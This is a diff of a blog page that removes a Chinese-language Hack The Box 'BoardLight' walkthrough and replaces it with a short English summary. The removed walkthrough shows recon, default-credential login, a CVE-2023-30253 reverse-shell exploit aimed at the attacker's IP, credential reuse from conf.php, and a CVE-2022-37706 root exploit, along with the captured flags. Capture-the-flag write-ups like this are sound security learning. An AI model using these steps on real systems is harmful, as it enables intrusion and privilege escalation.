@@ -202,7 +202,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2025-10-06 00:17:59 / Modified: 22:42:53" itemprop="dateCreated datePublished" datetime="2025-10-06T00:17:59+08:00">2025-10-06</time>
+      <time title="Created: 2025-10-06 00:17:59 / Modified: 23:36:55" itemprop="dateCreated datePublished" datetime="2025-10-06T00:17:59+08:00">2025-10-06</time>
     </span>
 
   
@@ -215,141 +215,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <span id="more"></span>
-
-<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ sudo nmap -sCV 10.10.11.11
-Password:
-Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-05 11:12 +0800
-Nmap scan report for 10.10.11.11 (10.10.11.11)
-Host is up (0.35s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
-|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
-|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 22.63 seconds
-</code></pre>
-<p>还是最基本的nmap 还是熟悉的配方80+22 访问页面并不能找到有意思的地方 遂查看源码</p>
-<p><img src="/2025/10/06/BoardLight/1.png"></p>
-<p>在页脚处看到了域名 由于上次做过类似的题目 于是尝试扫一下子域名</p>
-<pre><code>❯ ffuf -w subdomains-10000.txt -u http://10.10.11.11 -H &#39;Host: FUZZ.board.htb&#39; -fw 6243
-
-        /&#39;___\  /&#39;___\           /&#39;___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.10.11.11
- :: Wordlist         : FUZZ: /Users/joe/Documents/Red/SecDictionary/Subdomain_List/subdomains-10000.txt
- :: Header           : Host: FUZZ.board.htb
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response words: 6243
-________________________________________________
-
-crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 277ms]
-:: Progress: [11779/11779] :: Job [1/1] :: 130 req/sec :: Duration: [0:01:23] :: Errors: 0 ::
-</code></pre>
-<p>因为扫描时发现状态码都是200 只是返回长度不一样 于是使用<code>-fw 6243</code>来过滤</p>
-<pre><code>host                    [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 273ms]
-crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 277ms]
-mail1                   [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 277ms]
-</code></pre>
-<p>添加hosts之后访问域名 映入眼帘的是登陆框 属于Dolibarr应用 默认用户名应该是admin 尝试用burpsuite跑一下 </p>
-<p><img src="/2025/10/06/BoardLight/2.png"></p>
-<p>后来发现是重定向加token的情况 之前看不清是从哪个payload开始重定向 于是乎勾选重定向后发现了是admin&#x2F;admin登陆</p>
-<p><img src="/2025/10/06/BoardLight/3.png"></p>
-<h1 id="Shell-as-larissa"><a href="#Shell-as-larissa" class="headerlink" title="Shell as larissa"></a>Shell as larissa</h1><p>成功登陆之后发现基本上没有权限可用 于是乎试着找一下洞 成功找到<code>CVE-2023-30253</code>的洞并使用exp打进去</p>
-<pre><code>❯ python3 exploit.py http://crm.board.htb admin admin 10.10.X.X 4444
-[*] Trying authentication...
-[**] Login: admin
-[**] Password: admin
-[*] Trying created site...
-[*] Trying created page...
-[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
-
-❯ nc -lv 4444
-bash: cannot set terminal process group (849): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
-</code></pre>
-<p>连接进去之后发现是www用户 也是一样并没有什么权限 想着php框架大概率会有mysql的数据库 于是找到conf文件夹后 在配置conf.php中找到了连接数据库密码 并成功复用登陆至larissa</p>
-<pre><code>...
-$dolibarr_main_db_host=&#39;localhost&#39;;
-$dolibarr_main_db_port=&#39;3306&#39;;
-$dolibarr_main_db_name=&#39;dolibarr&#39;;
-$dolibarr_main_db_prefix=&#39;llx_&#39;;
-$dolibarr_main_db_user=&#39;dolibarrowner&#39;;
-$dolibarr_main_db_pass=&#39;serverfun2$2023!!&#39;;
-$dolibarr_main_db_type=&#39;mysqli&#39;;
-...
-
-❯ ssh larissa@10.10.11.11
-The authenticity of host &#39;10.10.11.11 (10.10.11.11)&#39; can&#39;t be established.
-ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#39;10.10.11.11&#39; (ED25519) to the list of known hosts.
-larissa@10.10.11.11&#39;s password:
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-larissa@boardlight:~$ cat user.txt
-f3c8f46b2c23a2ec6b0ee9ed7463c226
-</code></pre>
-<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>登陆larissa之后 发现没有sudo的权限 那么上传linpeas看看</p>
-<pre><code>...
-Vulnerable to CVE-2021-3560
-...
-</code></pre>
-<p>觉得有戏 但是不知道为什么连不上reverse_shell 查了一圈也没发现有人这样做 于是放弃 继续向下寻找</p>
-<pre><code>══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
-                      ╚════════════════════════════════════╝
-╔══════════╣ SUID - Check easy privesc, exploits and write perms
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
--rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
--rwsr-sr-x 1 root root 15K Apr  8  2024 /usr/lib/xorg/Xorg.wrap
--rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  ---&gt;  Before_0.25.4_(CVE-2022-37706)
--rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  ---&gt;  Before_0.25.4_(CVE-2022-37706)
--rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  ---&gt;  Before_0.25.4_(CVE-2022-37706)
-</code></pre>
-<p>这个洞比较简单 打就完了</p>
-<pre><code>larissa@boardlight:~$ chmod +x exploit.sh
-larissa@boardlight:~$ ./exploit.sh
-CVE-2022-37706
-[*] Trying to find the vulnerable SUID file...
-[*] This may take few seconds...
-[+] Vulnerable SUID binary found!
-[+] Trying to pop a root shell!
-[+] Enjoy the root shell :)
-mount: /dev/../tmp/: can&#39;t find in /etc/fstab.
-# cat /root/root.txt
-f72be6a718b053b9a2320048186075b2
-</code></pre>
-<p>这个靶机是有点简单了</p>
-
+          <p>BoardLight is an easy difficulty Linux machine that features a <code>Dolibarr</code> instance vulnerable to <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253">CVE-2023-30253</a>. This vulnerability is leveraged to gain access as <code>www-data</code>. After enumerating and dumping the web configuration file contents, plaintext credentials lead to <code>SSH</code> access to the machine. Enumerating the system, a <code>SUID</code> binary related to <code>enlightenment</code> is identified which is vulnerable to privilege escalation via <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706">CVE-2022-37706</a> and can be abused to leverage a root shell.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/10/06/BoardLight/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
